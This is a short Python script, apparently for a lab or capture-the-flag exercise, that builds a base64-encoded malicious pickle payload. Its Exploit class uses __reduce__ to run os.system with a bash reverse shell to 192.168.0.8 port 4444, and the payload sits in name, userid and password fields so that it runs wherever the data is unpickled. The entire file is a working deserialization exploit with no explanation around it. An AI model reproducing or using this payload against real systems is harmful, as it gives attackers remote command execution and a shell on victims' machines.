import pickle
import base64
import os


command = "exec 5<>/dev/tcp/192.168.0.8/4444 ; cat <&5 | while read evil; do $evil 2>&5 >&5; done"
class Exploit:
    def __reduce__(self):
        return (os.system, (command, ))

info = {'name' : Exploit(), 'userid': Exploit(), 'password' : Exploit()}
print(base64.b64encode(pickle.dumps(info)).decode('utf8'))